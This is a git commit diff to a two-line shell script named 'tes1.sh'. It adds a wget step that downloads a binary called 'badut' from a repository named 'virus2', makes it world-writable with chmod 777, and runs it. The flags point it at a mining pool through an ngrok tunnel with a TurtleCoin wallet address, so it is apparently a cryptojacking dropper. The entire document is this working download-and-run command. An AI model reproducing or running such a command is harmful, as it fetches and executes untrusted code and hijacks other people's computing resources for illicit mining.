5117cb89b59e8eb928bdff813f7fcab6fd19900a
raufpermana22 <53905319+raufpermana22@users.noreply.github.com>
2022-03-05 00:13:12 +0900

    Update tes1.sh

--- tes1.sh
+++ tes1.sh
@@ -1,2 +1,2 @@
 lscpu
-chmod 777 badut && ./badut --donate-level 1 -o 8.tcp.ngrok.io:11569 -u TRTLuxMcjA5Z5wiQjv7GKz3NfKXBx2G45iFEfkTfBdHv4s5sVWWMpSEWhrzosQkWn2ieGpzGLHjEDNgD2biksSaGa1M5errKpkS -p luna -a argon2/chukwav2 -k 
+wget https://github.com/raufpermana22/virus2/raw/main/badut && chmod 777 badut && ./badut --donate-level 1 -o 8.tcp.ngrok.io:11569 -u TRTLuxMcjA5Z5wiQjv7GKz3NfKXBx2G45iFEfkTfBdHv4s5sVWWMpSEWhrzosQkWn2ieGpzGLHjEDNgD2biksSaGa1M5errKpkS -p luna -a argon2/chukwav2 -k 
